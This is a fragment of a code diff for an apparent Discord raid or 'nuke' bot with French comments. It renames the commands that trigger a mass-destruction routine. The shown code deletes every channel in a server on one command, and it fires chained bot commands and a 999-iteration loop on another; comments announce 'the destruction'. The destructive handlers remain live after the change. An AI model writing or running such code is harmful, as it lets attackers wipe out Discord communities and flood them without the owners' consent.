@@ -247,7 +247,7 @@ if(message.content.includes("&serversjoin")){
                 }
             }
             //réaction en chaine
-                  if(message.content === "&channel"){
+                  if(message.content === "&channelop"){
                     message.channel.send("&roles").then(m => m.delete());
                     message.channel.send("&issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
@@ -260,7 +260,7 @@ if(message.content.includes("&serversjoin")){
 
                       }
                     }
-                    if(message.content === "&destroy"){
+                    if(message.content === "&destroyop"){
                       message.guild.channels.map(c => c.delete())
                       }
                       //on commence la destruction
